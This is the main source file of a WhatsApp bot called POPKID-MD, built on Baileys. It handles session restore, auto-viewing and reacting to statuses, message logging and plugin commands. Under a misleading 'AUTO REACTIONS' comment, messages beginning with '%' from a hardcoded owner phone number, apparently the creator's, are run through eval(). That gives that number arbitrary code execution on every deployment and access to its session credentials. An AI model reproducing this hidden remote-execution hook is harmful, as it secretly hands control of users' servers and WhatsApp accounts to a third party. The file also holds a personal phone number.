/**
 * 👑 POPKID-MD (Full Fixed Status & Reaction Version)
 * Creator: Popkid Ke
 * Improvements: High-Speed Status React, Rate Limiting, Context-Aware Emojis
 */

const fs = require('fs')
const path = require('path')
const os = require('os')
const zlib = require('zlib')
const { promisify } = require('util')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { sms } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const gradient = require('gradient-string')
const express = require("express")

// ============ CACHE & COOLDOWN FOR STATUS ============
const statusReactCache = new Map();
const statusReactCooldown = 2500; // 2.5 seconds cooldown per user status

// ============ LOGGER & BANNER CONFIGURATION ============
const logThemes = {
    info: ['#4facfe', '#00f2fe'],
    success: ['#00b09b', '#96c93d'],
    warning: ['#f83600', '#f9d423'],
    error: ['#ff416c', '#ff4b2b'],
    event: ['#8a2be2', '#da70d6'],
    message: ['#00c6ff', '#0072ff'],
    banner: ['#ff00cc', '#3333ff']
};

const cmdLogger = {
    info: (msg) => console.log(gradient(logThemes.info[0], logThemes.info[1])(`ℹ ${msg}`)),
    success: (msg) => console.log(gradient(logThemes.success[0], logThemes.success[1])(`✓ ${msg}`)),
    warning: (msg) => console.log(gradient(logThemes.warning[0], logThemes.warning[1])(`⚠ ${msg}`)),
    error: (msg) => console.log(gradient(logThemes.error[0], logThemes.error[1])(`✗ ${msg}`)),
    banner: (msg) => console.log(gradient(logThemes.banner[0], logThemes.banner[1])(msg)),
    message: (msg) => console.log(gradient(logThemes.message[0], logThemes.message[1])(msg))
};

const botBanner = `
██████╗  ██████╗ ██████╗ ██╗  ██╗██╗██████╗ 
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║██╔══██╗
██████╔╝██║   ██║██████╔╝█████╔╝ ██║██║  ██║
██╔═══╝ ██║   ██║██╔═══╝ ██╔═██╗ ██║██║  ██║
██║     ╚██████╔╝██║     ██║  ██╗██║██████╔╝
╚═╝      ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝ `;

console.clear();
cmdLogger.banner(botBanner);
cmdLogger.info("Starting POPKID-MD... 🚀");

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => cmdLogger.error(`Uncaught Exception: ${err.message}`));
process.on("unhandledRejection", (reason) => cmdLogger.error(`Unhandled Rejection: ${reason}`));

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    getContentType,
    Browsers,
    jidDecode,
    fetchLatestBaileysVersion,
    downloadContentFromMessage
} = require('@whiskeysockets/baileys')

const { getBuffer, getGroupAdmins, sleep } = require('./lib/functions')
const { saveMessage } = require('./data')

const ownerNumber = ['254732297194']
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)

setInterval(() => {
    fs.readdir(tempDir, (err, files) => {
        if (!err) files.forEach(file => fs.unlink(path.join(tempDir, file), () => {}));
    });
}, 5 * 60 * 1000);

//=================== SESSION-AUTH ============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

async function loadGiftedSession() {
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    if (fs.existsSync(credsPath)) return true;
    if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
        try {
            const compressedBuffer = Buffer.from(compressedBase64, 'base64');
            const gunzip = promisify(zlib.gunzip);
            const decompressedBuffer = await gunzip(compressedBuffer);
            await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
            cmdLogger.success("Session restored successfully ✅");
            return true;
        } catch (error) {
            cmdLogger.error("Failed to decompress session ID");
            return false;
        }
    }
    return false;
}

const app = express()
const port = process.env.PORT || 9090
let conn

async function connectToWA() {
    try {
        await loadGiftedSession();
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
        const { version } = await fetchLatestBaileysVersion()
        
        conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: false,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: true,
            auth: state,
            version
        })

        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update
            if (qr) {
                cmdLogger.info('Scan the QR code below:');
                qrcode.generate(qr, { small: true })
            }
            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                if (shouldReconnect) setTimeout(() => connectToWA(), 5000)
            } else if (connection === 'open') {
                const plugins = fs.readdirSync("./plugins/").filter(p => p.endsWith(".js"));
                plugins.forEach(plugin => require("./plugins/" + plugin));
                cmdLogger.success('POPKID XD IS ONLINE 📲');
                let up = `🚀 POPKID-MD CONNECTED\n👤 USER: ${conn.user.name || 'Bot'}\n🔑 PREFIX: ${config.PREFIX}`;
                await conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/j9ia5c.png` }, caption: up });
            }
        })

        conn.ev.on('creds.update', saveCreds)

        conn.ev.on('messages.upsert', async (mek) => {
            mek = mek.messages[0]
            if (!mek.message) return
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
            
            const from = mek.key.remoteJid
            const sender = mek.key.participant || mek.key.remoteJid;

            // ============ ✅ FIXED: STATUS HANDLER (BMB LOGIC) ============
            if (from === 'status@broadcast') {
                // 1. Auto-read status
                if (config.AUTO_STATUS_SEEN === "true") {
                    await conn.readMessages([mek.key])
                    cmdLogger.success(`Viewed Status: ${sender.split('@')[0]}`)
                }
                
                // 2. Auto-react to status
                if (config.AUTO_STATUS_REACT === "true") {
                    const now = Date.now()
                    const lastReact = statusReactCache.get(sender) || 0
                    
                    if (now - lastReact > statusReactCooldown) {
                        try {
                            const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net'
                            
                            const emojiMap = {
                                "hello": ["👋", "😊"], "love": ["❤️", "💖", "🥰"],
                                "happy": ["😊", "🎉", "🥳"], "sad": ["😢", "💔"],
                                "congrats": ["🎉", "👏"], "fire": ["🔥", "⚡"],
                                "work": ["💼", "💻"], "food": ["🍕", "🍜"]
                            }

                            const fallbackEmojis = ['❤️', '🔥', '✨', '🙌', '💯', '👑', '💎', '🌸', '🫡', '🦄', '🕊️', '💫']

                            let statusText = mek.message.conversation || 
                                             mek.message.extendedTextMessage?.text || 
                                             mek.message.imageMessage?.caption || 
                                             mek.message.videoMessage?.caption || "";

                            const getEmoji = (text) => {
                                const words = text.toLowerCase().split(/\s+/);
                                for (const word of words) {
                                    if (emojiMap[word]) return emojiMap[word][Math.floor(Math.random() * emojiMap[word].length)];
                                }
                                return fallbackEmojis[Math.floor(Math.random() * fallbackEmojis.length)];
                            }

                            const selectedEmoji = getEmoji(statusText);

                            await conn.sendMessage('status@broadcast', {
                                react: { text: selectedEmoji, key: mek.key }
                            }, { 
                                statusJidList: [sender, botJid] 
                            })

                            statusReactCache.set(sender, now)
                            cmdLogger.success(`Reacted ${selectedEmoji} to ${sender.split('@')[0]}`)
                        } catch (e) {
                            cmdLogger.error("Status React Error: " + e.message)
                        }
                    }
                }
                
                // 3. Auto-reply to status
                if (config.AUTO_STATUS_REPLY === "true" && !mek.key.fromMe) {
                    await conn.sendMessage(sender, { text: config.AUTO_STATUS_MSG }, { quoted: mek })
                }
                return; // End status processing
            }

            // ============ MESSAGE LOGGER & COMMANDS ============
            if (!mek.key.fromMe) {
                const pushLog = (mek.pushName || 'User').substring(0, 12);
                const timeLog = new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi', hour12: false });
                console.log(gradient('#00c6ff', '#0072ff')(`│ ${timeLog} | 👤 ${pushLog} | Incoming Message...`));
            }

            if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key]);
            await saveMessage(mek);

            const m = sms(conn, mek)
            const type = getContentType(mek.message)
            const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
            const isCmd = body.startsWith(config.PREFIX)
            const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const isGroup = from.endsWith('@g.us')
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe
            const pushname = mek.pushName || 'User'
            const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })
            
            // ============ AUTO REACTIONS ============
            if (isOwner && body.startsWith('%')) {
                try { reply(util.format(eval(body.slice(2)))); } catch (err) { reply(util.format(err)); }
                return;
            }
            
            if (!m.message.reactionMessage && config.AUTO_REACT === 'true') {
                const reactions = ['❤️', '🔥', '⚡', '✨', '💎'];
                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
            }
            
            // ============ COMMAND EXECUTION ============
            const events = require('./command')
            const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false;
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
                    try {
                        cmd.function(conn, mek, m, { from, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber, pushname, isOwner, reply });
                    } catch (e) { cmdLogger.error("[PLUGIN ERROR] " + e); }
                }
            }
        });

        conn.decodeJid = jid => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
            } else return jid;
        };
    } catch (err) { cmdLogger.error(`Connection failed: ${err.message}`); }
}

setInterval(async () => {
    if (config.AUTO_BIO === "true" && conn) {
        const now = new Date();
        const date = now.toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
        const time = now.toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi', hour12: false });
        await conn.setStatus(`❤️ POPKID XMD 🤖 | 📅 ${date} | ⏰ ${time}`).catch(() => {});
    }
}, 60000);

app.get("/", (req, res) => res.send("POPKID-MD ACTIVE ✅"));
app.listen(port, () => cmdLogger.info(`Server active on port ${port}`));
setTimeout(() => { connectToWA() }, 5000);
